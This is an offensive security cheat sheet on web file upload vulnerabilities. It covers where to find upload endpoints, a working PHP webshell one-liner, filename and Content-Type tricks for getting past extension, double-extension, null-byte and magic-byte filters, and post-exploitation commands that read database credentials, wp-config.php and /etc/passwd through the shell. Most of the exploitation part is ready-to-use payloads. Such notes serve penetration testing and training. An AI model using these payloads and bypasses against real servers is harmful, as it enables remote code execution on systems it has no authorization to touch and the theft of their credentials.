# 📁 File Upload

---

## 📖 Description

File Upload vulnerabilities occur when a web application allows users to upload files without properly validating their type, content, or name. If an attacker can upload a file that the server later executes — such as a PHP webshell — they gain the ability to **run arbitrary commands on the server**.

The severity depends on two factors: whether the uploaded file can be **executed** by the server (not just stored), and whether the attacker can **reach it via the browser**. When both conditions are met, the result is Remote Code Execution (RCE).

---

## 🔎 Detection

### Where to look

Any functionality that accepts file uploads is a potential target:

- Profile photo / avatar upload
- Attachments in comments or messages
- Document import features
- Any "Upload" or "Browse" button

### What to check after uploading a legitimate file

Before attempting anything malicious, upload a normal file and observe:

- **Where is it stored?** — Try to find the path in the response, page source, or by guessing common directories.
- **Is the filename changed?** — Some applications rename files, making it harder to reach the payload.
- **Is it accessible from the browser?** — Without direct access, execution is not possible.

### Common upload paths

```
/uploads/
/files/
/media/
/images/
/attachments/
/tmp/
/download/
/wp-content/uploads/
/files/avatars/
```

---

## 💥 Exploitation

The goal is to upload a PHP webshell that, once accessed through the browser, lets us run OS commands on the server.

### Creating the webshell

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

### 1. Basic upload — no filter

If there are no restrictions, upload `shell.php` directly and access it:

```
http://TARGET/uploads/shell.php?cmd=id
```

---

### 2. Content-Type filter

The server checks the `Content-Type` header in the request. Intercept with Burp and change it to a valid image type while keeping the `.php` extension:

```
filename="shell.php"
Content-Type: image/jpeg
```

---

### 3. Extension blacklist

The server blocks `.php` but only checks against a list of known extensions. Try alternative PHP extensions that may still be executed:

```
shell.php3
shell.php4
shell.php5
shell.phtml
shell.phar
shell.shtml
shell.PhP
shell.PHP5
```

> Also try combining these with `Content-Type: image/jpeg` to bypass double-layered filters.

---

### 4. Double extension

The server only checks the last extension, or only checks the first one. Test both orderings:

```
shell.jpg.php
shell.php.jpg
shell.png.php
shell.php.png

shell.php%00.jpg    ← null byte truncation (older servers)
shell.php%00.png
```

> Set the `Content-Type` to match the fake extension: `image/jpeg`, `image/png`, `image/gif`.

---

### 5. Rare extension + Magic Bytes

Some servers validate the file's magic bytes (the first bytes of the file content) instead of — or in addition to — the extension. Prepend the GIF magic bytes to the payload:

```
filename="shell.php5"
Content-Type: image/gif

GIF89a;
<?php system($_GET['cmd']); ?>
```

---

### 6. Double extension + Magic Bytes

Combine both techniques for stricter filters:

```
filename="shell.gif.php"
Content-Type: image/gif

GIF89a;
<?php system($_GET['cmd']); ?>
```

> Also try `filename="shell.php.gif"` depending on how the server parses the extension.

---

## 🔪 Post-Exploitation

Once the webshell is accessible and executing commands, the first priority is **reading sensitive files** to gather credentials and understand the environment.

### Always read first

```bash
# Database credentials
?cmd=cat+/var/www/html/config.php
?cmd=cat+/var/www/html/configuration.php
?cmd=cat+/var/www/html/db.php
?cmd=cat+/var/www/html/database.php

# System users
?cmd=cat+/etc/passwd

# Webroot structure
?cmd=ls+-la+/var/www/html

# Subdirectories
?cmd=ls+-la+/var/www/html/includes
?cmd=ls+-la+/var/www/html/admin
```

### CMS-specific config files

```bash
# WordPress
?cmd=cat+/var/www/html/wp-config.php

# Joomla
?cmd=cat+/var/www/html/configuration.php
```
